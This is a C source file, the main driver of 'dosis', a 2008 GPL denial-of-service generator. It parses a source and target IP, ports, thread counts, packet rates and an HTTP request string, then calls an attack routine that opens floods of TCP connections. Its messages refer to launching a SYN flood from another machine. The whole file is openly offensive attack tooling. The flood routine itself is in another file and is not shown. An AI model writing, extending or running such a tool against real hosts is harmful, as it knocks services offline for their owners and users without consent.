/*****************************************************************************
 * dosis.c
 *
 * DoS generator.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>
#include "dosis.h"
#include "log.h"
#include "tcpopen.h"

CONFIG config;

void handle_termination__signal(int s)
{
  if(!config.finalize)
  {
    WRN("One more termination signal will force program termination.");
    config.finalize = -1;
  } else {
    FAT("Program termination forced.");
    exit(1);
  }
}

int main(int argc, char *argv[])
{
  int res;
  u_int32_t opt;

  log_init();

  /* default configuration */
  bzero(&config, sizeof(CONFIG));

  config.verbosity = LOG_LEVEL_LOG; /* no debug */
  config.hits      = 1.0;           /* 60 hit per minute is ok                      */
  config.dev       = NULL;          /* i will be listening everywhere               */
  config.c         = 0;             /* default threads is always nice               */
  config.l         = 0;             /* default listener threads is always nice      */

  /* install signal handlers */
  signal(SIGHUP,  handle_termination__signal);
  signal(SIGINT,  handle_termination__signal);
  signal(SIGQUIT, handle_termination__signal);
  signal(SIGTERM, handle_termination__signal);

  /* get input parameters */
  while((opt = getopt(argc, argv, "c:C:d:D:H:l:p:r:R:s:S:T:v:w:W:X")) != -1)
  {
    switch(opt)
    {
      case 's':
        if(optarg)
        {
          res = inet_aton(optarg, &config.shost);
          if(!res)
            FAT("Bad source IP address.");
        }
        break;
      case 'd':
        if(optarg)
        {
          res = inet_aton(optarg, &config.dhost);
          if(!res)
            FAT("Bad target IP address.");
        }
        break;
      case 'S':
        if(optarg)
        {
          res = atoi(optarg);
          if(!res)
            FAT("Failed to convert the desired source port.");
          config.rsport = 0;
          config.sport = res;
        }
        break;
      case 'D':
        if(optarg)
        {
          res = atoi(optarg);
          if(!res)
            FAT("Failed to convert the desired destination port.");
          config.rdport = 0;
          config.dport = res;
        }
        break;
      case 'c':
        if((config.c = atol(optarg)) < 0)
          FAT("You cannot use less than 0 threads.");
        break;
      case 'C':
        if (!(config.cwait = atol(optarg)))
          FAT("Error getting connection timeout.");
        break;
      case 'H':
        sscanf(optarg, "%lf", &config.hits);
        if(config.hits < 0.0)
          FAT("Error getting hits per second.");
        break;
      case 'i':
        config.dev = optarg;
        break;
      case 'l':
        if((config.l = atol(optarg)) < 0)
          FAT("You cannot use less than 0 threads.");
        break;
      case 'p':
        if(!(config.packets = atoll(optarg)))
          FAT("Error getting number of packets.");
        break;
      case 'r':
        if((config.req = strdup(optarg)) == NULL)
          FAT("Failed to duplicate request...");
        config.req_size = strlen(config.req);
        break;
      case 'R':
        if(!(config.rwait = atol(optarg)))
          FAT("Error getting reply timeout.");
        break;
      case 'T':
        if(!(config.runtime = atol(optarg)))
          FAT("Error getting running time.");
        break;
      case 'v':
        if(optarg[0] != 'v')
        {
          config.verbosity = atoi(optarg);
          if(config.verbosity < 0 || config.verbosity >= LOG_LEVEL_ALL)
          {
            config.verbosity = LOG_LEVEL_ALL - 1;
            FAT("Verbosity out of range.");
          }
        } else {
          WRN("Oh My God! You Requested Super Hyper Full Noisy Debug Output Turbo II (TM).");
          config.verbosity = LOG_LEVEL_ALL-1;
        }
        break;
      case 'w':
        if(!(config.iwait = atoi(optarg)))
          FAT("Error getting interburst wait time.");
        break;
      case 'W':
        if(!(config.wait = atoi(optarg)))
          FAT("Error getting connection wait time.");
        break;
      case 'X':
        config.hits = 0;
        break;
      default:
        FAT("Bad option.");
        exit(-1);
    }
  }

  /* get arguments */
  config.args  = argv + optind;
  config.nargs = argc - optind;

  if(config.nargs > 0)
  {
    int i;

    DBG("Arguments:");
    for(i = 0; i < config.nargs; i++)
      DBG("  [%02d] '%s'", i, config.args[i]);
  } else
    DBG("Executed without arguments.");

  /* set the rest of options */
  config.rdport   = config.dport? 0 : 1;
  config.packets  = config.packets? config.packets : 1;
  config.iwait    = config.iwait? config.iwait : 500000;
  config.wait     = config.wait? config.wait : 2000000;
  config.cwait    = config.cwait? config.cwait : 3000000;
  config.rwait    = config.rwait? config.rwait : 10000000;
  config.runtime  = config.runtime? config.runtime : 1;
  if(!config.req)
  {
    config.req = strdup("GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n");
    config.req_size = strlen(config.req);
    WRN("Assuming default request (http://<addr>/)");
  }

  if(!(config.shost.s_addr))
    FAT("A source address is required!");
  if(!(config.dhost.s_addr))
    FAT("A destination address is required!");
  if(!config.dport)
    WRN("Setting a destination port (different from 0 is recommended).");

  if(config.l > config.c)
    FAT("You cannot make a set of listener threads bigger than available threads.");

  if(config.c == config.l)
  {
    WRN("All threads will listen, but none will send SYN packets.");
    WRN("Remember to launch a SYN flood attack from other process/machine.");
  } else

  if(config.c - config.l > 0
  && config.c - config.l > config.packets)
  {
    WRN("More sender threads than packets. Limiting sender threads to %d.", config.packets + 1);
    config.c = config.packets + config.l;
  }

  /* run attack and get stats */
  attack_tcpopen();
  LOG("Finished.");

  return 0;
}

